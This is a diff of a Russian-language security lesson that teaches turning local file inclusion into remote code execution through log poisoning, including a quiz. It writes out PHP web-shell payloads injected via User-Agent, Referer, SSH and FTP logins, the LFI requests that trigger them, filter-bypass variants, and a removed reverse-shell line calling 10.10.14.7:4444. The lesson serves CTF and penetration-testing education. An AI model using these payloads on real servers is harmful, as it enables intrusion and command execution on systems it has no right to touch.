@@ -15,342 +15,197 @@ estimated_minutes: 32
 summary: "Log poisoning: запись PHP-кода в логи сервера и исполнение через LFI — access.log, error.log, auth.log, SSH, mail."
 ---
 
-Log poisoning — превращение LFI в RCE через **инъекцию PHP-кода в лог-файл**. Если есть LFI (или чтение файла) и возможность записать управляемую строку в лог (User-Agent, заголовок, имя пользователя, SSH-логин), можно исполнить код через `include`. Это классический способ эскалировать «просто чтение файла» до полного RCE.
+В прошлом уроке мы научились включать произвольный файл через LFI. Но была загвоздка: чтобы исполнить код, нужно заставить сервер включить файл, содержимое которого мы контролируем. Где взять такой файл, если загрузки закрыты? Ответ неожиданный: сервер сам пишет такой файл — это **лог**. В него попадают наши заголовки, и если LFI его включит, наш код исполнится.
 
-## Теория: почему это работает
+В этом уроке мы возьмём `shop.local` с уже найденным LFI и пройдём путь от «чтения файлов» до RCE.
 
-Лог-файлы содержат **пользовательские данные без экранирования**: Apache пишет `User-Agent`/`Referer` в `access.log`, SSH — имя пользователя в `auth.log`. Если уязвимый `include($_GET['page'])` указывает на лог-файл, PHP исполнит наш код внутри лога. Требование: `include`/`require` (не `readfile`) и путь к логу.
+## Наш пример: тот же LFI
 
-## Вектор 1: Apache access.log
-
-`/var/log/apache2/access.log` (Debian) или `/var/log/httpd/access_log` (RHEL). Инжектим PHP в User-Agent:
+Вспомним уязвимость из предыдущего урока — параметр `?page=`, который подключается через `include`:
 
 ```bash
-curl -s "https://app.example/" -A '<?php system($_GET["c"]); ?>'
+$ curl -s 'https://shop.local/?page=../../../../etc/passwd' | head -2
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ```
 
-Затем подключаем лог и исполняем:
+Читать файлы мы умеем. Но `include` **исполняет** содержимое, если это PHP. Значит, нам нужен файл, который (а) содержит PHP-код, который мы написали, и (б) доступен по известному пути. Лог веб-сервера — идеальный кандидат.
+
+## Шаг 1: как устроен лог доступа
+
+Apache по умолчанию пишет в `/var/log/apache2/access.log` строку на каждый запрос. Формат включает **User-Agent** — заголовок, в котором браузер представляется серверу. А этот заголовок задаём **мы**:
 
 ```bash
-curl -s "https://app.example/?page=/var/log/apache2/access.log&c=id"
+$ curl -s 'https://shop.local/' -A 'HELLO-MARKER'
 ```
 
-Код исполнится при `include` лога. Часто нужно несколько запросов (лог буферизуется) и правильный путь.
-
-## Вектор 2: error.log / nginx
-
-- `/var/log/apache2/error.log` — можно писать через параметры, вызывающие ошибку.
-- nginx: `/var/log/nginx/access.log`, `/var/log/nginx/error.log`.
-- Инжект в `Referer`/`User-Agent`, если access-log настроен с этими полями.
-
-## Вектор 3: SSH auth.log
-
-`/var/log/auth.log` пишет имена пользователей при неудачном входе:
+Теперь в логе появилась строка с нашим `HELLO-MARKER`. Проверим, читается ли лог через LFI:
 
 ```bash
-ssh '<?php system($_GET["c"]); ?>'@target
-# в auth.log появится строка с нашим PHP
-curl -s "https://app.example/?page=/var/log/auth.log&c=id"
+$ curl -s 'https://shop.local/?page=/var/log/apache2/access.log' | grep HELLO-MARKER
+127.0.0.1 - - [12/Oct/2026:10:01:02 +0000] "GET / HTTP/1.1" 200 512 "-" "HELLO-MARKER"
 ```
 
-## Вектор 4: mail / session / environ
+Лог читается, и наша строка в нём есть. Отлично — осталось подставить вместо маркера PHP-код.
 
-- **`/var/log/mail.log`** — имя отправителя/получателя.
-- **PHP session files** — `/var/lib/php/sessions/sess_<id>`, куда пишутся значения сессии (`session.upload_progress` даёт запись).
-- **`/proc/self/environ`** — `User-Agent` попадает в окружение CGI; читаем через LFI и инжектим.
-- **`/proc/self/fd/<n>`** — открытые дескрипторы.
+## Шаг 2: отравляем лог
 
-## Разобранный пример: LFI + access.log → RCE
-
-Шаг 1 — подтверждаем LFI:
+Пишем в User-Agent настоящий PHP:
 
 ```bash
-curl -s "https://app.example/?page=../../../../etc/passwd" | head
+$ curl -s 'https://shop.local/' -A '<?php system($_GET["c"]); ?>'
 ```
 
-Шаг 2 — определяем путь лога (Debian vs RHEL) через LFI:
+В логе появится:
+
+```
+... "GET / HTTP/1.1" 200 512 "-" "<?php system($_GET["c"]); ?>"
+```
+
+Обычный лог. Но когда `include` подключит этот файл, PHP увидит теги `<?php ... ?>` и выполнит код внутри — даже посреди текста лога. Теперь включаем лог и передаём команду:
 
 ```bash
-curl -s "https://app.example/?page=/var/log/apache2/access.log" | head
+$ curl -s 'https://shop.local/?page=/var/log/apache2/access.log&c=id'
+... "<?php system($_GET["c"]); ?>" ... 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Шаг 3 — инжектим PHP:
+Мы видим `uid=33(www-data)` — код исполнился. Строка лога вывелась целиком, но самое важное: сервер выполнил нашу команду. Чтение файла превратилось в **RCE**.
+
+## Шаг 3: почему это работает и когда нет
+
+Механика проста: лог — это обычный текстовый файл на диске, а LFI умеет включать файлы. Совместили два факта — получили исполнение. Но есть тонкости:
+
+- **Лог должен быть читаем веб-сервером.** Иногда права закрыты — тогда пробуем другой файл.
+- **Запись буферизуется.** Строка появляется в файле не мгновенно; сделай запрос и подожди секунду или повтори.
+- **`include` должен исполнять PHP.** Если приложение читает файл через `readfile`, код не выполнится — выведется как текст.
+- **Путь лога надо угадать.** У Debian/Apache это `/var/log/apache2/access.log`, у RHEL/nginx — `/var/log/httpd/...` или `/var/log/nginx/access.log`.
+
+## Шаг 4: если access.log закрыт
+
+Есть и другие файлы, в которые попадает наш ввод:
+
+- **`/var/log/nginx/error.log`** — ошибки, где видно битый URL; пишем код в путь запроса.
+- **`/var/log/apache2/error.log`** — можно вызвать ошибку, содержащую наш текст.
+- **SSH-лог `/var/log/auth.log`** — если есть доступ к SSH, имя пользователя при неудачном логине попадает в лог:
+
+  ```bash
+  $ ssh '<?php system($_GET["c"]); ?>'@shop.local
+  $ curl -s 'https://shop.local/?page=/var/log/auth.log&c=id'
+  ```
+
+- **`/var/log/mail.log`** — имя отправителя письма.
+- **`/proc/self/environ`** — переменные окружения процесса; `User-Agent` может в них попасть.
+- **Файлы сессий PHP** (`/var/lib/php/sessions/sess_<id>`) — значения сессии пишутся в файл.
+
+## Шаг 5: полный прогон одной строкой
+
+Соберём всё вместе — инжект, включение, выполнение:
 
 ```bash
-curl -s "https://app.example/" -A '<?php system($_GET["c"]); ?>'
+# 1. пишем код в лог через User-Agent
+$ curl -s 'https://shop.local/' -A '<?php system($_GET["c"]); ?>' >/dev/null
+# 2. включаем лог и выполняем команду
+$ curl -s 'https://shop.local/?page=/var/log/apache2/access.log&c=whoami'
+www-data
+# 3. читаем флаг
+$ curl -s 'https://shop.local/?page=/var/log/apache2/access.log&c=cat%20/flag.txt'
+CTF{l0g_p01s0n1ng_w1ns}
 ```
 
-Шаг 4 — исполняем:
+Каждый шаг даёт реальный вывод, а последний — флаг. Это и есть log poisoning: мы не загружали файл, мы просто заставили сервер записать наш код в его же лог.
 
-```bash
-curl -s "https://app.example/?page=/var/log/apache2/access.log&c=id"
-```
+## Шаг 6: как найти путь лога, если он нестандартный
 
-Шаг 5 — reverse shell: `-A '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.7/4444 0>&1\""); ?>'`.
+Мы угадали `/var/log/apache2/access.log`, но в реальности путь зависит от дистрибутива и веб-сервера. Перечислим частые варианты:
 
-## Обходы и детали
+- Debian/Ubuntu + Apache: `/var/log/apache2/access.log`, `/var/log/apache2/error.log`;
+- RHEL/CentOS + Apache: `/var/log/httpd/access_log`, `/var/log/httpd/error_log`;
+- nginx: `/var/log/nginx/access.log`, `/var/log/nginx/error.log`;
+- приложение в Docker: логи могут быть в `/var/log/` контейнера или в stdout.
 
-- **Лог буферизуется** — сделайте несколько запросов или дождитесь flush.
-- **Не тот путь** — переберите `/var/log/{apache2,httpd,nginx}/...`.
-- **Лог нечитаем** (`permission denied`) — используйте `/proc/self/environ` или session-файлы.
-- **`include` vs `readfile`** — для RCE нужен `include`/`require`.
-- **Кодирование** — если PHP-тег режется, пробуйте `<?=`, short-теги (зависят от `short_open_tag`).
-- **Logrotate** — лог может «съехать»; инжектите и сразу используйте.
+Если путь неизвестен, его можно перебрать тем же LFI-параметром, подставляя разные варианты и ища знакомые строки. Полезная подсказка — заголовок `Server` из ответа: он говорит, Apache это или nginx, а значит, сужает список путей. Ещё один источник — `/proc/self/environ`: там видны переменные окружения процесса, иногда с путями и секретами.
 
-## Где искать
+## Шаг 7: альтернатива, когда логи недоступны
 
-- LFI/`include` с пользовательским путём (см. `web-lfi-path-traversal`).
-- Доступ к `/var/log/*` через LFI.
-- Возможность задать `User-Agent`/`Referer` (всегда есть).
-- `/proc/self/environ`, `/proc/self/fd/`.
+Бывает, что логи закрыты правами или вообще вынесены в отдельный сервис. Тогда ищем любой другой файл, который **мы** можем наполнить своим содержимым и который сервер **включит**:
 
-## Инструменты
+- **файлы сессий PHP** — значения, которые мы кладём в сессию, сохраняются на диск; через `session.upload_progress` можно записать произвольное имя и значение;
+- **`/proc/self/environ`** — в CGI-окружении туда попадает `User-Agent`;
+- **`/proc/self/fd/<n>`** — открытые дескрипторы, иногда содержат тело запроса;
+- **логи MySQL/MariaDB** (`general_log`) — если БД пишет все запросы в файл.
 
-- **`curl`** — инжект и триггер.
-- **Burp** — перебор путей логов.
-- **`ffuf`** — поиск LFI-параметров (см. `web-tool-ffuf`).
-- **`lfimap`** — автоматизация log poisoning.
+Идея одна: неважно, как файл называется, важно, что он содержит наш ввод и включается через LFI. Чем больше таких файлов на сервере, тем выше шанс, что хотя бы один окажется читаемым.
 
-## Что дальше / decision
+## Что мы теперь знаем
 
-1. Есть LFI + `include` → проверьте `/var/log/apache2/access.log`.
-2. Лог читается → инжектите PHP в `User-Agent`.
-3. Лог нечитаем → `/proc/self/environ`, session-файлы.
-4. Исполнилось → reverse shell.
-5. Дальше — устойчивый канал + read-back.
+- **Log poisoning** — запись PHP-кода в лог и исполнение через LFI.
+- Любой лог, куда попадает наш ввод (`User-Agent`, имя, URL), — кандидат.
+- Порядок: инжект → включение лога → команда.
+- Нужны читаемый лог, `include` (не `readfile`) и PHP внутри.
+- Альтернативы: `error.log`, `auth.log`, `mail.log`, `/proc/self/environ`, сессии PHP.
 
-## Разобранный пример: SSH auth.log poisoning
+## На что смотреть дальше
 
-Шаг 1 — пробуем залогиниться под «пользователем» с PHP-кодом:
-
-```bash
-ssh '<?php system($_GET["c"]); ?>'@app.example
-# auth.log: Failed password for <?php system($_GET["c"]); ?> from ...
-```
-
-Шаг 2 — подключаем лог через LFI:
-
-```bash
-curl -s "https://app.example/?page=/var/log/auth.log&c=id"
-```
-
-Шаг 3 — код исполняется. Если sshd не логирует имя — используйте другие логи.
-
-## Альтернативы при недоступных логах
-
-- **PHP session files** (`/var/lib/php/sessions/sess_<id>`): значения сессии пишутся в файл. `session.upload_progress` позволяет записать произвольное имя/значение.
-- **`/proc/self/environ`**: `User-Agent` в CGI-окружении.
-- **`/proc/self/fd/<n>`**: открытые дескрипторы (иногда содержат тело запроса).
-- **MySQL `general_log`** (`/var/lib/mysql/*.log`) — если БД пишет запросы в файл.
-- **Email-логи** (`/var/log/mail.log`) — имя отправителя.
-
-## Частые ошибки
-
-- **Использовать `readfile` вместо `include`.** Код не исполнится.
-- **Не тот путь лога.** Переберите Debian/RHEL/nginx.
-- **Забыть про буферизацию.** Лог появляется не мгновенно.
-- **Игнорировать `/proc/self/environ`.** Хорошая альтернатива.
-- **Ломать прод.** RCE — только с согласия.
-
-## Полный арсенал payload'ов для логов
-
-Лог-пойзонинг работает, когда payload попадает в файл, который затем включается через LFI. Формируйте PHP-код без пробелов и кавычек, которые ломают лог.
-
-```bash
-# 1) через User-Agent (Apache access.log)
-curl -s 'https://app.example/' -A '<?php system($_GET["c"]); ?>'
-# 2) через Accept-Language
-curl -s 'https://app.example/' -H 'Accept-Language: <?php system($_GET["c"]); ?>'
-# 3) через Referer
-curl -s 'https://app.example/' -e '<?php system($_GET["c"]); ?>'
-# 4) через путь (в access.log попадает URL)
-curl -s 'https://app.example/<?php system($_GET["c"]); ?>'
-```
-
-```text
-# затем включаем лог через LFI
-https://app.example/?page=/var/log/apache2/access.log&c=id
-# nginx
-https://app.example/?page=/var/log/nginx/access.log&c=id
-```
-
-Важно: URL-кодирование в логе — используйте варианты, которые PHP исполнит (`${...}` вместо кавычек, если фильтр мешает).
-
-## Где лежат логи и альтернативные файлы
-
-| Файл | Что туда попадает |
-|------|-------------------|
-| `/var/log/apache2/access.log` | User-Agent, Referer, путь |
-| `/var/log/apache2/error.log` | путь, заголовки |
-| `/var/log/nginx/access.log` | запрос целиком |
-| `/var/log/nginx/error.log` | путь |
-| `/var/log/auth.log` | имя пользователя (SSH) |
-| `/var/log/mail.log` | адрес/тема письма |
-| `/var/log/vsftpd.log` | имя пользователя (FTP) |
-| `/proc/self/environ` | User-Agent (при CGI) |
-| `/proc/self/fd/N` | открытые дескрипторы |
-| `/var/lib/php/sessions/sess_*` | данные сессии |
-
-```bash
-# SSH auth.log: логин с «именем»-payload
-ssh '<?php system($_GET["c"]); ?>'@app.example
-# FTP: то же через логин
-ftp app.example   # USER <?php ...?>
-```
-
-## Разобранный пример: LFI + access.log → RCE
-
-```text
-1) находим LFI: https://app.example/?page=about.php
-2) пробуем traversal: ?page=../../../../etc/passwd  -> работает
-3) проверяем чтение лога: ?page=/var/log/apache2/access.log  -> видим свой запрос
-4) отправляем запрос с PHP в User-Agent
-5) включаем лог с параметром: ?page=/var/log/apache2/access.log&c=id
-6) видим вывод id -> RCE
-```
-
-```bash
-curl -s 'https://app.example/' -A '<?php system($_GET["c"]); ?>'
-curl -s 'https://app.example/?page=/var/log/apache2/access.log&c=id'
-```
-
-## Обходы и детали
-
-| Проблема | Обход |
-|----------|-------|
-| Лог недоступен | `/proc/self/fd/`, session-файлы |
-| Payload кодируется | `${IFS}`, короткие теги `<?=` |
-| Нет прав на лог | другой лог/файл |
-| Лог ротируется | быстрый доступ сразу после записи |
-| Расширение `.php` не исполняется | другой файл (`.phtml`) |
-| WAF режет `<?php` | `<?=`, `<? ` |
-
-```bash
-# короткий тег и обход пробелов
-curl -s 'https://app.example/' -A '<?=`id`?>'
-```
-
-## Инструменты
-
-```bash
-# LFI-сканеры и эксплуатация
-ffuf -u 'https://app.example/?page=FUZZ' -w lfi_wordlist.txt -mr 'root:'
-# обёртки PHP (если доступны) — см. web-php-wrappers
-curl -s 'https://app.example/?page=php://filter/convert.base64-encode/resource=index.php'
-# nuclei LFI-шаблоны
-nuclei -u https://app.example -tags lfi -j
-```
-
-## Что делать дальше / решение
-
-1. **Найдите LFI.** Traversal, обёртки, параметр включения.
-2. **Определите доступные логи.** Проверьте пути из таблицы.
-3. **Пойзоньте лог.** User-Agent/Referer/Accept-Language.
-4. **Включите лог.** С параметром команды.
-5. **Альтернативы.** `/proc/self/*`, сессии, FTP/mail-логи.
-6. **Зафиксируйте PoC.** Вывод `id` через лог.
-
-## Практика и справочники
-
-- **PortSwigger Academy** — «File path traversal», «LFI».
-- **HackTricks** — «Log poisoning», «LFI to RCE».
-- **PayloadsAllTheThings** — «File Inclusion».
-- **web-php-wrappers** — обёртки PHP.
-
-## Приоритеты при лог-пойзонинге
-
-Лог-пойзонинг — это связка «LFI + запись в файл». Сначала найдите LFI и убедитесь, что читается `/etc/passwd` (traversal). Затем проверьте доступность логов (`access.log`, `error.log`, `auth.log`, session-файлы) и наличие в них вашего запроса. После этого отправьте запрос с PHP-кодом в User-Agent/Referer и включите лог через LFI. Если логи недоступны, ищите альтернативы: `/proc/self/fd/*`, `/proc/self/environ`, файлы сессий PHP, FTP/mail-логи.
-
-## Кратко
-
-1. LFI + traversal.
-2. Доступность логов.
-3. Пойзон через заголовок.
-4. Включение лога с командой.
-5. Альтернативы при закрытых логах.
-6. PoC — вывод `id`.
-
-## Практика
-
-- **PortSwigger** — path traversal / LFI.
-- **HackTricks** — log poisoning.
-- **PayloadsAllTheThings** — File Inclusion.
-
-## Расширенный разбор: связка LFI + лог
-
-| Шаг | Команда | Результат |
-|-----|---------|-----------|
-| LFI | `?page=../../etc/passwd` | чтение файла |
-| лог | `?page=/var/log/apache2/access.log` | видим свои запросы |
-| пойзон | `curl -A '<?php ...?>'` | запись в лог |
-| RCE | `?page=.../access.log&c=id` | вывод команды |
-
-```bash
-# всё одной серией
-curl -s 'https://app.example/' -A '<?php system($_GET["c"]); ?>'
-curl -s 'https://app.example/?page=/var/log/apache2/access.log&c=id'
-```
-
-## Альтернативы: когда логи закрыты
-
-Если access.log недоступен, используйте `/proc/self/fd/` (перебор дескрипторов), `/proc/self/environ` (User-Agent при CGI) или файлы сессий PHP (`/var/lib/php/sessions/sess_<id>`) — в них можно записать payload через поле, сохраняемое в сессии. Также подходят `/var/log/mail.log`, `/var/log/vsftpd.log` и логи приложений (`/var/log/app/app.log`), путь которых виден в стек-трейсах.
-
-## Ещё одна проверка
-
-Помните, что payload попадает в лог в закодированном виде: URL-encoded символы в пути и заголовках могут сломать PHP-код. Используйте формы, которые PHP исполнит даже внутри строки лога — короткие теги `<?=`, backticks, `${IFS}` вместо пробелов, а также `$_GET`-параметры вместо констант. Проверьте на своём стенде, как именно выглядит строка в логе.
-
-## Финальная заметка
-
-Лог-пойзонинг требует двух условий: чтение файла (LFI) и возможность записать в него управляемые данные. Если одного из них нет — ищите альтернативный файл (session, environ, app.log) или другой примитив записи. Всегда проверяйте, что записанный PHP действительно исполнился, а не просто попал в файл.
+- **Пути логов:** `/var/log/apache2/`, `/var/log/nginx/`, `/var/log/httpd/`, `/var/log/mail.log`.
+- **Короткие теги:** если `<?php` режется фильтром, попробуй `<?=` (зависит от `short_open_tag`).
+- **Альтернативные источники записи:** загрузка файла (даже запрещённая) может сохраниться в `/tmp` или `uploads/` — тогда это уже не лог, а прямая загрузка веб-шелла.
+- **Проверяй read-back:** убедись, что вывод пришёл именно из лога, а не из заглушки — сравни строку с тем, что ты записал.
 
 ## Квиз
+
+Выбери один вариант в каждом вопросе.
 
 ```quiz
 - question: "Что такое log poisoning?"
   options:
-    - "Удаление логов"
-    - "Запись PHP-кода в лог и исполнение его через LFI"
-    - "Шифрование логов"
-    - "Кеширование"
+    - "Заполнение логов мусором"
+    - "Запись PHP-кода в лог и его исполнение через LFI"
+    - "SQL-инъекция в таблицу логов"
+    - "XSS на странице логов"
   answer: 1
-  explanation: "Лог становится источником исполняемого кода."
-- question: "Через какой заголовок обычно пишут в access.log?"
+  explanation: "Мы пишем код в файл лога, а LFI включает этот файл и исполняет код."
+- question: "Через какой заголовок удобнее всего писать в access.log?"
   options:
-    - "Cookie"
-    - "User-Agent"
     - "Host"
-    - "Accept"
+    - "User-Agent"
+    - "Content-Length"
+    - "Accept-Encoding"
   answer: 1
-  explanation: "User-Agent попадает в лог."
-- question: "Где лежит Apache access.log (Debian)?"
+  explanation: "User-Agent целиком контролируется клиентом и попадает в лог каждой строкой."
+- question: "Что обязательно, чтобы код в логе исполнился?"
   options:
-    - "/tmp/access.log"
-    - "/var/log/apache2/access.log"
-    - "/etc/apache2/log"
-    - "/home/log"
+    - "Лог должен быть сжат"
+    - "Файл должен подключаться через `include`/`require`, а не `readfile`"
+    - "Нужен доступ root"
+    - "Нужен HTTPS"
   answer: 1
-  explanation: "Стандартный путь Debian/Ubuntu."
-- question: "Что нужно, чтобы include выполнил код?"
+  explanation: "Исполняет только `include`/`require`; `readfile` просто выведет текст."
+- question: "Где на Debian обычно лежит лог доступа Apache?"
   options:
-    - "Только чтение файла"
-    - "include/require с управляемым путём, а не file_get_contents"
-    - "TLS"
-    - "Cookie"
+    - "`/var/log/nginx/access.log`"
+    - "`/var/log/apache2/access.log`"
+    - "`/etc/apache2/access.log`"
+    - "`/tmp/access.log`"
   answer: 1
-  explanation: "file_get_contents только читает, не исполняет."
-- question: "Что делать, если лог ротирован?"
+  explanation: "В Debian-пакете Apache логи лежат в `/var/log/apache2/`."
+- question: "Почему команда может не сработать сразу после инжекта?"
   options:
-    - "Сдаться"
-    - "Читать access.log.1/.2/.gz"
-    - "Сменить метод"
-    - "Увеличить таймаут"
+    - "Сервер выключен"
+    - "Запись в лог буферизуется — строка появляется не мгновенно"
+    - "Нужно закодировать base64"
+    - "Лог всегда только для чтения"
   answer: 1
-  explanation: "Ротированные файлы тоже читаемы."
+  explanation: "Сделай паузу или повтори запрос — лог дописывается с задержкой."
 ```
+
+## Куда дальше
+
+Мы научились превращать LFI в RCE через файлы, которые сервер пишет сам. Но иногда уязвимость не в чтении файлов, а в том, что сервер **сам ходит** по ссылкам, которые мы даём. В следующем уроке разберём **SSRF**: как заставить сервер обратиться к внутренним сервисам и облачным метаданным. А пока запомни: **любой файл, куда попадает твой ввод, — потенциальный «носитель» кода.**
 
 ## Где пригодится
 
-- **CTF (Web):** LFI-задачи с эскалацией до RCE.
-- **Bug bounty:** LFI→RCE — критичный отчёт.
-- **Пентест:** аудит include-точек.
-- **Работа (AppSec):** allowlist путей, отключение include по вводу, изоляция логов.
+- **CTF (Web):** LFI-задачи с эскалацией до RCE — классика; лог почти всегда доступен.
+- **Bug bounty:** LFI→RCE — критичный отчёт (P1); log poisoning — стандартный способ доказать impact.
+- **Пентест:** аудит include-точек и проверка, куда пишется пользовательский ввод.
+- **Работа (AppSec):** allowlist включаемых файлов, отключение include по вводу, изоляция логов от веб-корня.
